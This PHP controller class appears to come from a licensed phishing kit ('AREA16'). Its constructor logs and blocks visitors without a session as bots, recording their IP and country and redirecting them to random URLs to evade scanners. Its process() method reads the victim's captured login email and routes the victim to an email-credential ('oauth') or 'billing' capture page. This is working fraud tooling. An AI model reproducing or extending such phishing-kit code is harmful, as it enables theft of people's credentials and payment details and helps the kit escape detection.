<?php 
defined("ACCESS") or die('Konz');

class Activity 
{
	private $_LICENSE = FCPATH . "AREA16/system/private/license.ini";
	private $_CONFIG = FCPATH. "AREA16/system/private/setting.json";

	public function __construct()
	{
		$this->pc = new Pc();
		$_ini_file = parse_ini_file($this->_LICENSE);
		$this->license = new license($_ini_file);

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 2)) {

			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$this->pc->agent}|{$this->pc->platform}|Access Page Without Session|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{	
		if ($this->pc->is_mobile) {
			echo view('activity/index-mobile');
		} else {
			echo view('activity/index-desktop');
		}
	
	}

	public function process()
	{	
		preg_match("/\@(.+)\./", $_SESSION['emailLogin'], $match);

		$_SESSION['email_type'] = $match[1];

		if (_config('get_email') == 'on') {
			$_SESSION['access'] = 3;
			redirect(base_url() . 'oauth/#_ts='. md5(rand(0, 999)));				
		} else {
			$_SESSION['access'] = 4;
			redirect(base_url() . 'billing?_ts='. md5(time()));
		}
	}
}